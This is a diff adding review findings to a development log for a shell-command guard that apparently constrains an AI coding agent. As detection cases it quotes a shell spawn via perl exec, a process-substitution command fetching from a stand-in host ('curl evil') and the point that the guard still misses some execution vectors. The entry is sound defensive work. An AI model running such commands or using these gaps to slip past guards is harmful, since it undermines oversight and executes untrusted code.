@@ -68,3 +68,24 @@ Single approach — remove snapshot mechanism, replace with "document and contin
 ### Tech debt acknowledged
 - PIPE_SHELL still doesn't catch all execution vectors (e.g., `perl -e 'exec("bash")'`). Guard is "a speed bump, not a wall."
 - `using-superpowers` skill may still auto-invoke WFM commands if the plugin skill bug persists. Needs monitoring.
+
+## Review Findings (REVIEW phase)
+
+5-agent review pipeline dispatched. Findings fixed in commit `b5b8ed0`:
+
+### Fixed
+- [QUAL] PROC_SUB pattern extended with optional absolute path prefix (`/usr/local/bin/zsh <(curl evil)`)
+- [SEC] gh exception extended to block pipe-to-interpreter (`python3`/`node`/`ruby`/`perl`/`awk`)
+- [QUAL/ARCH] Unescaped inner double-quotes in post-tool-navigator stall messages fixed
+- [QUAL] Dead `complete_discuss` helper removed from test suite
+- [QUAL] Added PROC_SUB and interpreter tests for COMPLETE phase
+
+### Accepted (pre-existing, not introduced by this session)
+- [GOV] Worktree cleanup in complete.md Step 6 lacks merge-verification gate
+- [HYG] Stale snapshot references in old spec/plan docs (150+ references in docs/superpowers/)
+- [HYG] `COMPLETE_WRITE_WHITELIST` includes `.claude/commands/` with no producer
+
+### False positives rejected
+- [SEC] PIPE_SHELL `+=` concatenation "may silently fail" — verified correct during DISCUSS, 867 tests pass
+- [HYG] `isolation: "worktree"` called a no-op — it's a valid Agent tool parameter
+- [ARCH] Snapshot tests don't capture stderr — they already use `2>&1`
